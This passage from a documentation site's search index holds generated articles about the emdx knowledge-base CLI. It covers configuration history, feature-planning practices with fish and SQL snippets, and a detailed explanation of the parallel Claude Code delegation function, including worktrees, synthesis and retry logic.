orchestrator</li> <li>Environment Detection: <code>emdx/utils/environment.py</code> \u2014 CLI tool detection and validation</li> <li>Model Resolution: <code>emdx/config/models.py</code> \u2014 Alias expansion and model name mapping</li> </ul>"},{"location":"articles/emdx-configuration-architecture/#historical-context","title":"Historical Context","text":"<p>Configuration Debt Audit (Document #6230, #6231): - Identified 42 issues across Critical/High/Medium/Low severity - 6 Critical: Duplicate model definitions, hardcoded timeouts - 12 High: Inconsistent environment variable handling, missing validation - 18 Medium: Magic numbers, UI layout values, hardcoded paths</p> <p>Implementation Timeline: - 2026-02-14: PR #506 (initial fixes) - 2026-02-14: PR #511 (timeout centralization) - 2026-02-14: PR #526 (environment validation) - 2026-02-22: PR #689 (Cursor removal, rebased)</p> <p>Test Coverage: - All changes validated with 797-1200 passing tests - No regressions introduced during centralization - Pre-commit hooks enforced (ruff, mypy) throughout</p> <p>Generated from 13 source documents</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/","title":"EMDX Implementation Planning: Best Practices Guide","text":""},{"location":"articles/emdx-implementation-planning-best-practices-guide/#overview","title":"Overview","text":"<p>This guide documents best practices for planning and implementing features in EMDX, derived from successful patterns across multiple feature implementations. It covers testing strategies, implementation planning, and interactive development workflows.</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/emdx-implementation-planning-best-practices-guide/#implementation-strategy","title":"Implementation Strategy","text":"<p>Phased Development Successful implementations follow a multi-phase approach: - Diagnostic Phase: Understand the current system before making changes - Detection Phase: Identify patterns and requirements - Implementation Phase: Build the solution incrementally - Validation Phase: Test and verify functionality</p> <p>Example: The Claude-Save Hook implementation demonstrates this pattern perfectly - starting with command logging to understand the actual format, then building detection logic, and finally implementing the fix.</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#testing-plans","title":"Testing Plans","text":"<p>Comprehensive Test Coverage Testing plans should address multiple dimensions: - Functionality Tests: Core feature works as expected - Edge Cases: Special characters, boundary conditions, error states - Integration Tests: Feature works with existing system - Performance Tests: Acceptable speed with realistic data volumes - User Experience Tests: Intuitive and discoverable</p> <p>Example Test Checklist:</p> <pre><code>- [ ] Feature works with test data\n- [ ] Special characters handled correctly\n- [ ] Error messages are clear\n- [ ] Performance acceptable with large datasets\n- [ ] UI/UX is intuitive\n- [ ] Documentation updated\n</code></pre>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#interactive-development","title":"Interactive Development","text":"<p>Command-Line First Design EMDX follows a \"same commands, different output modes\" philosophy: - Default output: Plain text (machine/pipe friendly) - <code>--rich</code> flag: Colored Rich output with visual enhancements - <code>--json</code> flag: Structured machine output - TUI: Interactive visual interface</p> <p>All features should work across these modes with consistent behavior.</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/emdx-implementation-planning-best-practices-guide/#modal-interface-pattern","title":"Modal Interface Pattern","text":"<p>Problem: Key binding conflicts between navigation (j/k) and actions in interactive browsers</p> <p>Solution: Vim-like modal interface with distinct NORMAL and ACTION modes</p> <pre><code>mode_bindings = {\n    \"normal\": {\n        \"j\": \"down\",\n        \"k\": \"up\", \n        \"g\": \"first\",\n        \"G\": \"last\",\n        \"/\": \"toggle-search\",\n        \"a\": \"switch-to-action-mode\",\n        \"enter\": \"execute(view)\"\n    },\n    \"action\": {\n        \"e\": \"execute(edit)+reload\",\n        \"d\": \"execute(delete)+reload\",\n        \"v\": \"execute(view)\",\n        \"r\": \"execute(rename)+reload\",\n        \"t\": \"execute(tag)+reload\",\n        \"esc\": \"switch-to-normal-mode\"\n    }\n}\n</code></pre> <p>Benefits: - No key conflicts between modes - Vim-like feel for experienced users - Easy to extend with new actions - Clear visual feedback via prompt changes</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#safety-first-delete-operations","title":"Safety-First Delete Operations","text":"<p>Mandatory Safety Features: - Confirmation prompts by default - Show full document preview before deletion - Soft delete option (mark as deleted but preserve data) - Undo capability for recently deleted items</p> <pre><code>function claude-delete\n    # Show what will be deleted\n    claude-view $id\n\n    # Confirmation prompt (unless --force)\n    read -P \"Delete this document? [y/N] \" confirm\n\n    # Perform deletion\n    if test \"$confirm\" = \"y\"\n        _clauding_db \"UPDATE knowledge SET deleted_at = CURRENT_TIMESTAMP WHERE id = $id\"\n    end\nend\n</code></pre>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#document-relationships","title":"Document Relationships","text":"<p>Link Syntax Support: - <code>[[Document Title]]</code> - Wiki-style links - <code>#2106</code> - Reference by ID - <code>{{fuzzy match}}</code> - Fuzzy match link - <code>See also: #2106, #2107</code> - Multiple references</p> <p>Bidirectional Tracking:</p> <pre><code>CREATE TABLE knowledge_links (\n    source_id INTEGER REFERENCES knowledge(id),\n    target_id INTEGER REFERENCES knowledge(id),\n    link_type TEXT DEFAULT 'reference'\n);\n</code></pre> <p>Automatically maintain both <code>references</code> and <code>referenced_by</code> arrays for quick navigation.</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#version-history-strategy","title":"Version History Strategy","text":"<p>Git-Style Versioning: - Automatic version creation on content changes - Store diffs for minor changes (space efficient) - Compress old versions - Smart change summaries (\"Added section: Implementation Details\")</p> <pre><code>CREATE TABLE knowledge_versions (\n    id SERIAL PRIMARY KEY,\n    document_id INTEGER REFERENCES knowledge(id),\n    version_number INTEGER NOT NULL,\n    content TEXT,\n    change_summary TEXT,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n</code></pre>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#status-line-design","title":"Status Line Design","text":"<p>Command Help + Context Display:</p> <p>Bottom status bar should show both available commands and current state:</p> <pre><code>[dim]j/k:nav /:search e:edit d:delete v:view r:refresh q:quit[/dim] | [bright]45/150 docs[/bright]\n</code></pre> <p>Mode-Aware Display: - NORMAL mode: Show navigation and action commands - SEARCH mode: Show search-specific commands and filter status - Use rich markup for visual hierarchy</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/emdx-implementation-planning-best-practices-guide/#phased-implementation-pattern","title":"Phased Implementation Pattern","text":"<p>Phase 1: Diagnostic/Understanding</p> <pre><code># Example: Hook that logs commands to understand format\nfunction claude-debug-hook\n    set -l input (cat)\n    echo \"[(date)] $input\" &gt;&gt; ~/claude-commands.log\n    echo $input  # Pass through unchanged\nend\n</code></pre> <p>Phase 2: Detection/Parsing</p> <pre><code># Detect specific patterns and extract components\nif string match -q \"*claude-save*\" $cmd\n    set -l matches (string match -r 'claude-save\\s+([^\\s]+)\\s+\"([^\"]+)' $cmd)\n    # Process matches...\nend\n</code></pre> <p>Phase 3: Safe Transformation</p> <pre><code># Generate safe SQL with proper escaping\nfunction create_safe_insert_command -a filepath title\n    set -l escaped_content (echo $content | sed \"s/'/\\'\\''/g\")\n    set -l escaped_title (echo $title | sed \"s/'/\\'\\''/g\")\n    # Generate SQL...\nend\n</code></pre> <p>Phase 4: Comprehensive Solution</p> <pre><code># Final version handling multiple edge cases\nfunction claude-command-hook\n    set -l tool (echo $input | jq -r '.tool // empty')\n    switch $cmd\n        case \"*pattern1*\"\n            process_pattern1\n        case \"*pattern2*\"\n            process_pattern2\n    end\nend\n</code></pre>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#search-optimization","title":"Search Optimization","text":"<p>Full-Text Search Enhancement:</p> <pre><code>-- Weighted search vectors\nUPDATE knowledge \nSET search_vector = \n    setweight(to_tsvector('english', title), 'A') ||\n    setweight(to_tsvector('english', content), 'B');\n</code></pre> <p>Search Syntax: - <code>claude-find \"term\"</code> - Search everywhere - <code>claude-find title:\"term\"</code> - Title only - <code>claude-find content:\"term\"</code> - Content only - <code>claude-find project:name AND keyword</code> - Combined filters</p> <p>Context Display:</p> <pre><code>2106 \u2502 FZF Interactive Claude List v1 Plan \u2502 clauding \u2502 2025-01-05\n     \u2502 \u21b3 ...implement a minimal but powerful cla function...\n</code></pre>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#sub-agent-parallelization","title":"Sub-Agent Parallelization","text":"<p>Problem: Sequential operations are slow for financial data retrieval</p> <p>Solution: Parallel sub-agents for independent tasks</p> <pre><code># Sequential (slow): 8 seconds total\nemails = []\nemails += search_emails(\"bank statements\")  # 2s\nemails += search_emails(\"credit cards\")     # 2s\nemails += search_emails(\"investments\")      # 2s\nemails += search_emails(\"bills\")           # 2s\n\n# Parallel (fast): 2 seconds total\nsub_agents = [\n    EmailSubAgent(\"bank statements\"),\n    EmailSubAgent(\"credit cards\"),\n    EmailSubAgent(\"investments\"),\n    EmailSubAgent(\"bills\")\n]\nresults = parallel_execute(sub_agents)\n</code></pre> <p>Best Practices: - Define clear boundaries for each sub-agent - Minimize dependencies between sub-agents - Use appropriate granularity (don't create too many small sub-agents) - Handle failures gracefully - Aggregate results intelligently</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#gmail-search-optimization","title":"Gmail Search Optimization","text":"<p>Comprehensive Query Pattern:</p> <pre><code># Instead of multiple searches, use one comprehensive query\nafter:2025/06/01 before:2025/07/01 (bank OR credit OR payment OR invoice OR bill OR statement)\n</code></pre> <p>Category-Based Searches:</p> <pre><code># Retail\nfrom:(amazon.com OR ebay.com OR target.com)\n\n# Services  \nfrom:(netflix.com OR spotify.com OR adobe.com)\n\n# Financial\nfrom:(*bank.com OR *card.com) subject:(statement OR payment)\n</code></pre>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#related-topics","title":"Related Topics","text":""},{"location":"articles/emdx-implementation-planning-best-practices-guide/#mcp-integration","title":"MCP Integration","text":"<p>Playwright MCP enables browser automation: - Navigate web pages - Take screenshots - Execute JavaScript - Interact with accessibility trees</p> <p>Integration Pattern:</p> <pre><code>function claude-playwright-test\n    set -l test_name $argv[1]\n    set -l url $argv[2]\n\n    # Create test plan template\n    echo \"# $test_name Test Plan\" &gt; \"$test_name.md\"\n\n    # Run test with Playwright\n    # Save results to knowledge base\n    claude-test-save $test_name.md screenshots/*.png\nend\n</code></pre>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#email-management","title":"Email Management","text":"<p>Structured Analysis Approach: 1. Use comprehensive search queries to minimize API calls 2. Categorize emails (Retail, Services, Financial, etc.) 3. Extract key information (balances, due dates, transactions) 4. Generate weekly reports with actionable insights</p> <p>Security Best Practices: - Enable 2FA on email accounts - Never store full account numbers in plain text - Review account access regularly - Watch for phishing attempts with targeted searches</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#document-organization","title":"Document Organization","text":"<p>Tags vs. Task Categories: - Documents: Use plain text tags (<code>gameplan</code>, <code>active</code>, <code>analysis</code>) - Tasks: Use categories (<code>FEAT</code>, <code>FIX</code>, <code>ARCH</code>) and epics</p> <p>Link Graph: - Build connections between related documents - Automatic backlink tracking - Visual graph representation - \"See Also\" suggestions based on shared tags and similar content</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#configuration-management","title":"Configuration Management","text":"<p>Hook-Based Workflow:</p> <pre><code>{\n  \"hooks\": {\n    \"before_tool_use\": \"fish -c 'source ~/.config/fish/functions/hook.fish &amp;&amp; hook'\"\n  }\n}\n</code></pre> <p>Testing Workflow: 1. Create hook script 2. Configure Claude Code to use it 3. Test with simple commands 4. Monitor logs for verification 5. Iterate based on usage</p>"},{"location":"articles/emdx-implementation-planning-best-practices-guide/#success-criteria","title":"Success Criteria","text":"<p>When implementing new features, verify:</p> <p>Functionality: - \u2713 Core feature works reliably - \u2713 Special characters and edge cases handled - \u2713 Error messages are clear and actionable - \u2713 Performance acceptable with realistic data</p> <p>User Experience: - \u2713 Commands are intuitive and discoverable - \u2713 Help text shows available options - \u2713 Visual feedback confirms actions - \u2713 Keyboard shortcuts follow conventions</p> <p>Integration: - \u2713 Works across CLI/TUI/JSON output modes - \u2713 Integrates with existing features - \u2713 No breaking changes to existing workflows - \u2713 Documentation updated</p> <p>Safety: - \u2713 Destructive operations require confirmation - \u2713 Undo/restore capability where appropriate - \u2713 Data validation prevents corruption - \u2713 Clear warnings for risky actions</p> <p>Generated from 10 source documents</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/","title":"emdx: Parallel Task Execution with _run_parallel()","text":""},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#overview","title":"Overview","text":"<p>The <code>_run_parallel()</code> function in <code>emdx/commands/delegate.py</code> is the core parallel execution engine for the emdx delegate command. It orchestrates concurrent execution of multiple Claude Code sessions using Python's <code>ThreadPoolExecutor</code>, enabling users to dispatch 2-10 research or coding tasks simultaneously and collect their results. The function handles the complete lifecycle: parent task creation, thread pool management, per-task worktree isolation, result collection, optional synthesis, and status reporting.</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#key-concepts","title":"Key Concepts","text":""},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#parallel-execution-model","title":"Parallel Execution Model","text":"<p>Users invoke parallel execution with:</p> <pre><code>$ emdx delegate \"analyze auth module\" \"review test coverage\" \"scan for XSS\"\n</code></pre> <p>This spawns three concurrent Claude Code sessions, each receiving its own task prompt. Results are collected and optionally synthesized into a unified summary.</p> <p>Concurrency limits: - Maximum 10 concurrent workers (prevents API rate limiting) - Configurable via <code>-j/--jobs</code> flag - Defaults to <code>min(jobs or len(tasks), len(tasks), 10)</code></p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#task-hierarchy","title":"Task Hierarchy","text":"<p>Every parallel execution creates a group task to track the batch:</p> <pre><code>parent_task_id = epic_parent_id or _safe_create_task(\n    title=title or f\"Parallel: {len(tasks)} tasks\",\n    prompt=\" | \".join(t[:60] for t in tasks),\n    task_type=\"group\",\n    status=\"active\",\n    source_doc_id=source_doc_id,\n    tags=flat_tags,\n)\n</code></pre> <p>This parent task: - Does not receive epic numbering (like <code>TUI-10</code> or <code>FEAT-12</code>) - Serves as a container for child tasks - Tracks final status: <code>done</code>, <code>partial</code>, or <code>failed</code> - Links to subtasks via <code>parent_task_id</code> foreign key</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#synthesis-mode","title":"Synthesis Mode","text":"<p>When <code>--synthesize</code> is enabled, the function performs an additional step after all tasks complete:</p> <ol> <li>Collects outputs from successful tasks</li> <li>Summarizes failed tasks with error messages</li> <li>Constructs a synthesis prompt combining all results</li> <li>Executes an additional <code>_run_single()</code> call to generate a unified summary</li> <li>Returns only the synthesis output to the user (individual task outputs are saved to the knowledge base but not printed)</li> </ol> <p>Synthesis prompt structure:</p> <pre><code># Multiple Tasks Completed\n\n## Task 1 (SUCCESS): analyze auth module\n[content from successful task]\n\n## Task 3 (SUCCESS): scan for vulnerabilities\n[content from successful task]\n\n## Failed Tasks\n\nThe following tasks failed:\n\n- **Task 2**: review test coverage: execution timeout\n\n---\n\nSynthesize these results into a cohesive summary...\n</code></pre> <p>The synthesis agent understands which tasks succeeded and failed, allowing it to note absences and provide context about incomplete work.</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#worktree-isolation","title":"Worktree Isolation","text":"<p>The function supports three worktree modes:</p> Mode Flag Behavior No worktree (default) All tasks run in main repository Per-task worktree <code>--worktree</code> Each task gets isolated worktree, cleaned up after completion Persistent worktree <code>--branch</code> Worktrees created but NOT cleaned up (local branch persists) <p>When <code>--pr</code> is passed (which implies <code>--worktree</code>), worktrees are cleaned up after the PR is created because the branch has already been pushed to remote\u2014the local worktree is no longer needed.</p> <p>Worktree creation pattern:</p> <pre><code>task_worktree_path, _ = create_worktree(base_branch, task_title=task)\n</code></pre> <p>This creates an isolated git worktree at <code>../emdx-worktree-&lt;uuid&gt;</code>, allowing each task to make independent changes without conflicts.</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#architecture-design-decisions","title":"Architecture &amp; Design Decisions","text":""},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#why-_run_parallel-must-stay-in-the-launcher","title":"Why _run_parallel() Must Stay in the Launcher","text":"<p>According to the delegate slimming analysis, <code>_run_parallel()</code> is classified as (B) MUST STAY IN LAUNCHER because hooks cannot orchestrate multiple concurrent sessions. The SessionStart/Stop/SessionEnd hooks fire per-session, not per-batch. There is no hook event for \"I want to run 5 Claude sessions in parallel.\"</p> <p>This is a fundamental orchestration responsibility requiring process-level control unavailable to hooks running inside child sessions. The launcher owns:</p> <ul> <li>ThreadPoolExecutor lifecycle</li> <li>Worktree creation before sessions start</li> <li>Worktree cleanup after sessions end</li> <li>Result collection across multiple processes</li> </ul>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#function-signature","title":"Function Signature","text":"<pre><code>def _run_parallel(\n    tasks: list[str],\n    tags: list[str],\n    title: str | None,\n    jobs: int | None,\n    synthesize: bool,\n    model: str | None,\n    quiet: bool,\n    pr: bool = False,\n    branch: bool = False,\n    draft: bool = False,\n    base_branch: str = \"main\",\n    source_doc_id: int | None = None,\n    worktree: bool = False,\n    epic_key: str | None = None,\n    epic_parent_id: int | None = None,\n) -&gt; list[int]:\n    \"\"\"Run multiple tasks in parallel via ThreadPoolExecutor. Returns doc_ids.\"\"\"\n</code></pre> <p>Returns a list of document IDs representing saved outputs from each successful task.</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#failure-resilience","title":"Failure Resilience","text":"<p>The function gracefully handles partial failures:</p> <p>Extended <code>SingleResult</code> dataclass:</p> <pre><code>@dataclass\nclass SingleResult:\n    doc_id: int | None = None\n    task_id: int | None = None\n    pr_url: str | None = None\n    branch_name: str | None = None\n    success: bool = True\n    error_message: str | None = None\n</code></pre> <p>Failure tracking logic:</p> <ul> <li>Separates successful results from failed results</li> <li>Counts success/failure rates</li> <li>Only exits with error if all tasks fail</li> <li>Logs partial failure counts: <code>\"delegate: 2/3 task(s) succeeded, 1 failed\"</code></li> </ul> <p>Parent task status updates:</p> Result Status Error Field All tasks succeed <code>done</code> <code>None</code> Some tasks fail <code>partial</code> <code>\"N/M tasks failed\"</code> All tasks fail <code>failed</code> <code>\"all tasks failed\"</code> (exits with code 1) <p>This allows the command to report partial results rather than aborting on the first failure.</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#implementation-details","title":"Implementation Details","text":""},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#execution-flow","title":"Execution Flow","text":"<p>1. Parent Task Creation (lines 659-668)</p> <p>Creates a group task to organize all subtasks hierarchically. If <code>epic_parent_id</code> is provided (via <code>--epic</code>), that existing epic becomes the parent instead.</p> <p>2. Branch Name Pre-Generation (lines 670-674)</p> <p>For <code>--pr</code> or <code>--branch</code> mode, pre-generates unique branch names before thread execution:</p> <pre><code>branch_names: list[str | None] = [None] * len(tasks)\nif pr or branch:\n    for i, task in enumerate(tasks):\n        branch_names[i] = generate_delegate_branch_name(task)\n</code></pre> <p>This ensures consistent naming and avoids race conditions.</p> <p>Branch naming pattern: - <code>delegate/{slugified-title}-{short-hash}</code> - Strips common prefixes (\"Gameplan #N:\", \"Feature:\", \"Fix:\") - Converts to lowercase with hyphens, truncated to 40 chars - Appends 5-character SHA1 hash to prevent collisions</p> <p>Examples: - <code>\"Fix the auth bug\"</code> \u2192 <code>delegate/the-auth-bug-96590</code> - <code>\"Gameplan #1: Contextual Save\"</code> \u2192 <code>delegate/contextual-save-8183a</code></p> <p>3. Nested Worker Function (lines 679-727)</p> <p>The <code>run_task()</code> closure encapsulates per-task execution:</p> <pre><code>def run_task(idx: int, task: str) -&gt; tuple[int, SingleResult]:\n    task_title = title or f\"Delegate: {task[:60]}\"\n    if len(tasks) &gt; 1:\n        task_title = f\"{task_title} [{idx + 1}/{len(tasks)}]\"\n\n    task_worktree_path = None\n    if worktree:\n        try:\n            task_worktree_path, _ = create_worktree(base_branch, task_title=task)\n        except Exception as e:\n            return idx, SingleResult()\n\n    try:\n        result = (\n            idx,\n            _run_single(\n                prompt=task,\n                tags=tags,\n                title=task_title,\n                model=model,\n                quiet=True,  # suppress per-task metadata\n                pr=pr,\n                branch=branch,\n                pr_branch=branch_names[idx],\n                draft=draft,\n                working_dir=task_worktree_path,\n                parent_task_id=parent_task_id,\n                seq=idx + 1,\n                epic_key=epic_key,\n            ),\n        )\n        return result\n    finally:\n        if task_worktree_path and not branch:\n            cleanup_worktree(task_worktree_path)\n</code></pre> <p>Each thread: 1. Builds a task-specific title with position indicator (e.g., \"[2/5]\") 2. Optionally creates an isolated git worktree 3. Calls <code>_run_single()</code> with <code>quiet=True</code> to suppress individual task metadata 4. Cleans up the worktree in the <code>finally</code> block (unless <code>--branch</code> requires the local branch to persist)</p> <p>4. Parallel Execution with ThreadPoolExecutor (lines 728-732)</p> <pre><code>max_workers = min(jobs or len(tasks), len(tasks), 10)\n\nresults: dict[int, SingleResult] = {}\n\nwith ThreadPoolExecutor(max_workers=max_workers) as executor:\n    futures = {executor.submit(run_task, i, task): i for i, task in enumerate(tasks)}\n    for future in as_completed(futures):\n        idx, single_result = future.result()\n        results[idx] = single_result\n</code></pre> <p>Tasks are submitted to a <code>ThreadPoolExecutor</code> with <code>max_workers</code> capped at 10. The function uses <code>as_completed()</code> to collect results as they finish, storing them in a dictionary indexed by original task position to preserve order.</p> <p>5. Result Collection and Error Handling (lines 734-759)</p> <pre><code>doc_ids: list[int] = [\n    r.doc_id for i in range(len(tasks)) if (r := results.get(i)) and r.doc_id is not None\n]\n\nfailed_tasks: list[tuple[int, str, str | None]] = [\n    (i, tasks[i], results[i].error_message)\n    for i in range(len(tasks))\n    if (r := results.get(i)) and not r.success\n]\n\nsucceeded_count = len(doc_ids)\nfailed_count = len(failed_tasks)\n\nif not doc_ids:\n    sys.stderr.write(\n        f\"delegate: parallel run completed but all {failed_count} task(s) failed\\n\"\n    )\n    _safe_update_task(parent_task_id, status=\"failed\", error=\"all tasks failed\")\n    raise typer.Exit(1) from None\n\nif failed_count &gt; 0:\n    sys.stderr.write(\n        f\"delegate: {succeeded_count}/{len(tasks)} task(s) succeeded, {failed_count} failed\\n\"\n    )\n</code></pre> <p>The function: - Extracts document IDs from successful tasks (filtering out <code>None</code> values) - Collects failed task metadata (index, prompt, error message) - Exits with code 1 if all tasks failed - Logs partial failures to stderr</p> <p>6. PR and Branch Summary Output (lines 767-771)</p> <p>If <code>--pr</code> or <code>--branch</code> was requested, the function calls <code>_print_pr_summary()</code> or <code>_print_branch_summary()</code> to emit a formatted table of created PRs or pushed branches to stderr.</p> <p>7. Synthesis Pass (lines 774-841)</p> <p>When <code>--synthesize</code> is enabled and at least one task succeeded:</p> <pre><code>if synthesize and (len(doc_ids) &gt; 1 or (len(doc_ids) &gt;= 1 and failed_count &gt; 0)):\n    combined = []\n\n    # Add successful task results\n    for i in range(len(tasks)):\n        r = results.get(i)\n        if r and r.doc_id is not None:\n            doc = get_document(r.doc_id)\n            if doc:\n                combined.append(\n                    f\"## Task {i + 1} (SUCCESS): {tasks[i][:80]}\\n\\n{doc.get('content', '')}\"\n                )\n\n    # Add failed task summaries\n    if failed_tasks:\n        failed_section = \"## Failed Tasks\\n\\nThe following tasks failed:\\n\\n\"\n        for idx, task_prompt, error_msg in failed_tasks:\n            error_info = f\": {error_msg}\" if error_msg else \"\"\n            failed_section += f\"- **Task {idx + 1}**: {task_prompt[:80]}{error_info}\\n\"\n        combined.append(failed_section)\n\n    synthesis_prompt = synthesis_intro + \"\\n\\n---\\n\\n\".join(combined)\n    synthesis_result = _run_single(\n        prompt=synthesis_prompt,\n        tags=tags,\n        title=f\"{synthesis_title} [synthesis]\",\n        model=model,\n        quiet=True,\n        parent_task_id=parent_task_id,\n    )\n    if synthesis_result.doc_id:\n        doc_ids.append(synthesis_result.doc_id)\n</code></pre> <p>The synthesis is dispatched as a new <code>_run_single()</code> call with a <code>[synthesis]</code> suffix in the title. The resulting document ID is appended to <code>doc_ids</code>, and the parent task is updated with the synthesis output as its primary result.</p> <p>8. Output Modes (lines 842-859)</p> <p>Without synthesis:</p> <pre><code>for i, doc_id in enumerate(doc_ids):\n    if len(doc_ids) &gt; 1:\n        sys.stdout.write(f\"\\n=== Task {i + 1}: {tasks[i] if i &lt; len(tasks) else '?'} ===\\n\")\n    _print_doc_content(doc_id)\n</code></pre> <p>Each successful task's output is printed to stdout with separators.</p> <p>With synthesis:</p> <p>Only the synthesis result is printed to stdout (via <code>_run_single()</code> \u2192 <code>_print_doc_content()</code>). Individual task outputs are saved to the database but not printed.</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#memory-context-injection","title":"Memory Context Injection","text":"<p>When <code>--memory N</code> is specified, the function injects context from recent delegate outputs:</p> <ul> <li>Queries N most recent docs tagged <code>needs-review</code> OR <code>delegate-output</code></li> <li>Filters out docs tagged <code>rejected</code> or <code>\ud83d\udeab</code></li> <li>Truncates each doc to ~2000 chars (~500 tokens)</li> <li>Prepends formatted memory section to each task prompt:</li> </ul> <pre><code>--- PRIOR DELEGATE MEMORY (N most recent) ---\n## [1] Doc #1234: Title (2h ago)\n[content...]\n--- END MEMORY ---\n</code></pre>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#integration-with-retry-logic","title":"Integration with Retry Logic","text":"<p>The <code>--retry N</code> flag enables exponential backoff for transient failures (rate limits, 429s, timeouts, 5xx errors, connection errors). The retry logic lives in <code>_run_single()</code>, not <code>_run_parallel()</code>. Each thread in the pool calls <code>_run_single()</code>, which wraps the execution in a retry loop.</p> <p>Retryable errors: - Timeouts - Rate limits (429) - \"too many requests\" messages</p> <p>Non-retryable errors: - Validation errors - Environment errors - User abort (exit 130)</p> <p>Backoff formula:</p> <pre><code>delay = min(2 * (2^attempt), 60)  # with \u00b120% jitter\n</code></pre> <p>Example delays: 2s \u2192 4s \u2192 8s \u2192 16s \u2192 32s \u2192 60s (capped)</p>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#session-lifecycle-integration","title":"Session Lifecycle Integration","text":"<p>The function relies on Claude Code hooks for ambient behavior:</p> Hook Event What it does <code>prime.sh</code> SessionStart Injects KB context (ready tasks, in-progress) <code>save-output.sh</code> Stop Auto-saves output to KB (delegate sessions only) <code>session-end.sh</code> SessionEnd Updates task status (delegate sessions only) <p>Environment variables set by delegate:</p> Variable Used by Purpose <code>EMDX_AUTO_SAVE</code> save-output.sh Enable auto-save (\"1\" to activate) <code>EMDX_DOC_ID</code> prime.sh Include document as context <code>EMDX_TASK_ID</code> prime.sh, session-end.sh Track task lifecycle <code>EMDX_TITLE</code> save-output.sh Document title for saved output <code>EMDX_TAGS</code> save-output.sh Tags for saved output <code>EMDX_BATCH_FILE</code> save-output.sh Parallel coordination file <code>EMDX_EXECUTION_ID</code> session-end.sh Execution record to update"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#batch-coordination-file","title":"Batch Coordination File","text":"<p>When <code>synthesize=True</code>, creates a JSON file to coordinate parallel task outputs:</p> <ul> <li>Written to <code>~/.config/emdx/parallel_batch_{uuid4()}.json</code></li> <li>Environment variable <code>EMDX_BATCH_FILE</code> passed to each task</li> <li>The save-output hook reads this file to know which parallel batch it belongs to</li> </ul>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#usage-examples","title":"Usage Examples","text":"<pre><code># Basic parallel execution\n$ emdx delegate \"check auth\" \"review tests\" \"scan for XSS\"\n\ud83d\udccb Saved as #42: check auth\n\ud83d\udccb Saved as #43: review tests\n\ud83d\udccb Saved as #44: scan for XSS\n\n# Parallel with synthesis\n$ emdx delegate --synthesize \"task1\" \"task2\" \"task3\"\n\ud83d\udccb Saved as #45 [synthesis]: Combined analysis\n\n# Parallel with PRs (each task creates its own PR in isolated worktree)\n$ emdx delegate --pr \"fix bug A\" \"fix bug B\" \"fix bug C\"\n\n# Implement multiple gameplans with PRs\n$ emdx delegate --pr -j 7 6097 6098 6099 6100 6101 6102 6103\n\n# Parallel with custom concurrency\n$ emdx delegate -j 5 \"t1\" \"t2\" \"t3\" \"t4\" \"t5\"\n\n# With memory context and retry\n$ emdx delegate --memory 3 --retry 5 \"analyze auth\" \"scan for XSS\"\n\n# Draft PRs with worktrees\n$ emdx delegate --pr --draft \"experimental feature\"\n\n# Custom base branch\n$ emdx delegate --branch -b develop \"add feature X\"\n</code></pre>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#related-topics","title":"Related Topics","text":""},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#related-functions","title":"Related Functions","text":"<ul> <li><code>_run_single()</code>: Executes individual tasks (called by each thread)</li> <li><code>_run_chain()</code>: Sequential task execution with chaining</li> <li><code>_make_pr_instruction()</code>: Generates PR creation instructions with <code>--draft</code> support</li> <li><code>cleanup_worktree()</code>: Removes git worktrees in <code>utils/git.py</code></li> <li><code>validate_pr_preconditions()</code>: Validates PR readiness in <code>utils/git.py</code></li> <li><code>generate_delegate_branch_name()</code>: Creates unique branch names with collision prevention</li> </ul>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#synthesis-vs-synthesis_servicepy","title":"Synthesis vs synthesis_service.py","text":"<p>Synthesis is implemented directly in delegate.py, NOT using <code>synthesis_service.py</code>. This allows delegate-specific features like task numbering and partial failure handling. The inline implementation ensures:</p> <ul> <li>No content duplication (results dict is keyed by index)</li> <li>Task-specific metadata (success/failure counts, error messages)</li> <li>Proper parent task status updates</li> </ul>"},{"location":"articles/emdx-parallel-task-execution-with-runparallel/#performance-characteristics","title":"Performance Characteristics","text":"<ul> <li>Concurrency: Up to 10 parallel tasks per <code>delegate</code> call (configurable via <code>-j</code>)</li> <li>Token budget: With <code>--memory 5</code>, total context ~2500 tokens across 5 docs</li> <li>Retry overhead: Max 7 attempts \u00d7 60s delay = ~7 minutes worst-case per task</li> <li>Worktree overhead: Each worktree is full git checkout (~same size as repo)</li> 